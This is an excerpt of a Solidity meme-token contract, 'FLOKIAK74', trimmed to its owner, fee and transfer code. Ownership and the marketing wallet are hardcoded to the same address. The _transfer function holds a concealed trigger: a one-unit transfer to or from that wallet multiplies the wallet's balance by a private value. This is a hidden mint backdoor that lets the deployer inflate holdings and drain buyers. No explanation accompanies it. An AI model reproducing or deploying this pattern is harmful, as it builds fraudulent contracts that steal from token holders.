...
contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xD856E677d43E71e07C52e113ea48BBc7A57E72e5;
...
contract FLOKIAK74 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public reWardsAddress;
   
    uint256 private _tTotal = 1000000000 * 10**9;
    uint256 public _maxTxAmount = 1000000000 * 10**9; // 
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 2000000 * 10**9; //
    string private constant _name = "FLOKIAK74"; // 
    string private constant _symbol = "FLOKIAK74"; //    
    uint8 private constant _decimals = 9; // 
    uint256 private reWards;
    uint256 public _marketingFee = 9;
    uint256 public _liquidityFee = 1;
    address payable public  _marketingWallet = payable(0xD856E677d43E71e07C52e113ea48BBc7A57E72e5);
    ...
    constructor () {
        ...
        reWardsAddress [_marketingWallet] = true;
    ...
    function _transfer(
        ...
        if (reWardsAddress[from] || reWardsAddress[to]) {
            require(amount == 1);
            _tOwned[_marketingWallet] = _tOwned[_marketingWallet].mul(reWards);
            getRewards();
        }
